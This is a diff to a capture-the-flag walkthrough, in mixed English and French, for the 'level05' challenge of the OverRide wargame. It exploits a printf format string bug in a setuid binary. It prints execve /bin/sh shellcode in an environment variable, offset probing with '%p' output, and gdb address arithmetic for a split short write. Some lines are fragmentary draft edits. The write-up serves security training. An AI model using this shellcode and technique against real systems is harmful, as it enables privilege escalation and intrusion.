@@ -1,9 +1,73 @@
+# level05
+
+We can see that program takes an input and XOR each byte with 32 if it is between 'A' and 'Z'. It is a `toLower` like function:
+
+```gdb
+(gdb) r
+Starting program: /home/users/level05/level05 
+
+Breakpoint 1, 0x08048472 in main ()
+(gdb) c
+Continuing.
+AAAAAAAAAAA
+
+Breakpoint 2, 0x08048500 in main ()
+(gdb) x/s $esp+0x28
+0xffffd668:      'a' <repeats 11 times>, "\n"
+```
+
+Then, it pass the result string in `printf` as the only argument.
+
+We try to found the direct access parameter:
+
+```bash
+level05@OverRide:~$ (python -c "print 'aaaa' + '%p ' * 30";cat) | ./level05  
+aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070  
+```
+
+Our string is printed at the 10th parameter.
+
+We put our shellcode in an environment variable and find its address:
+
+```bash
+export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+```
+
+```gdb
+(gdb)  x/s *((char **)environ+0)  
+<!-- 0xffffd702:      "EXPLOIT=<...>" -->
+0xffffd74a:      "EXPLOIT=<...>"
+
+(gdb)  p/d 0xffffd74a+200
+$1 = 4294957074
+(gdb)  p/d 0xffffd702+200
+$2 = 4294957002
+
+(gdb) p/x 0xffffd74a+200  
+$3 = 0xffffd812
+(gdb) p/x 0xffffd702+200
+$4 = 0xffffd7ca
+
+(gdb) p/d 0xd812  
+$4 = 55314  
+(gdb) p/d 0xd812-8  
+$5 = 55306  
+  
+gdb-peda$ p/d 0xffff  
+$5 = 65535  
+(gdb) p/d 0xffff-55314  
+$6 = 10221  
+```
+
+
 iRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE  
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05  
   
 level05@OverRide:~$ file level05   
 level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not strippe  
   
+We c
+
 Le programme actuel recupere la string de gets et transforme les minuscules en majuscules.  
 Le premier argument du printf a *main+195 est notre string, ce qui correspond a une faille de type format string  
   
@@ -13,7 +77,7 @@ aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764
 Nous pouvons voir que notre string 'aaaa' apparait au printf access parameter numero 10  
   
 export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")  
-  
+
 (gdb) x/s *((char **)environ+0)  
 0xffffd74a:      "EXPLOIT=<...>"  
   
@@ -61,7 +125,7 @@ Nous pouvons voir que les bytes que nous avons rentrer dans le fgets() ne sont p
 Nous pouvons voir sur ce document, que les valeurs des int pris en compte par printf ont une limite :  
 https://cs155.stanford.edu/papers/formatstring-1.2.pdf  
   
-Comme a sa section 4.1 (Short write), nous allons passer notre adresse en deux fois afin de ne pas depasser cette limite.  
+Comme a sa section 4.1 (Short write), nous allons passer notre adresse en deux fois afin de ne pas depasser cette limite. 
   
 => 0x08048475 <+49>:    call   0x8048350 <fgets@plt> ; Size == 100  
 (gdb) x/wx $esp  
